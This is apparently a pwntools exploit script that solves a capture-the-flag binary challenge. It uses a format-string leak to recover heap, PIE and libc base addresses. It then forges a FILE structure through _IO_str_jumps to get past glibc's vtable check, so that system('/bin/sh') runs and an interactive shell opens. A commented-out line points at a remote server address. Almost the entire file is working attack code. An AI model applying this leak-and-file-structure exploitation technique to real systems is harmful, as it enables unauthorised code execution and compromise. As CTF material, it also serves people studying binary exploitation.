from pwn import *

context.arch = 'amd64'
libc = ELF('./libc.so.6')

def open():
	r.sendlineafter('>', '1')

def read():
	r.sendlineafter('>', '2')

def edit(offset, content):
	r.sendlineafter('>', '3')
	r.sendlineafter(':', str(offset))
	r.sendafter(':', content)

def close():
	r.sendlineafter('>','4')

def DEBUG(script=''):
	gdb.attach(r, script)

g_text = 0x202060
g_fp = 0x202260
g_init = 0x202268
g_filepath = 0x202280

r = process('./chall')
#r = remote('13.231.207.73', 9008)

# leak address
open()
read()
edit(0x200, flat(0, 1, 0, 0, '%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\x00'))
open()
r.recvuntil('0x')
heap_base = int(r.recvn(12), 16) - 0x16d0
print "heap_base @ ", hex(heap_base)
r.recvuntil('0x')
pie_base = int(r.recvn(12), 16) - 0x162a
print "pie_base @ ", hex(pie_base)
for i in range(5):
	r.recvuntil('7f')

libc_base = int('7f'+r.recvn(10), 16)-0x21b97
print "libc_base @ ", hex(libc_base) 
system = libc_base + libc.symbols['system']

bss = pie_base + 0x202000
buf = pie_base + g_text

vtable = libc_base + 0x3e8360
sh = libc.search('/bin/sh').next() + libc_base

# libc-2.24 and newer version will check vtable address
# so we use _IO_str_jumps and call _IO_finish_ to get shell
# reference: https://xz.aliyun.com/t/5579

# gef> p *(_IO_strfile *)buf
fd = fit({
	   0x28: flat(1), # _IO_write_ptr
	   0x38: flat(sh), # _IO_buf_base
	   0x88: flat(bss), # lock
	   0xd8: flat(vtable),
	   0xe8: flat(system) # _free_buf
	},filler=(ord('\x00'),))

edit(0, '\x00'*0x200)
edit(0, fd)
edit(0x200, p64(buf))

close()
r.interactive()
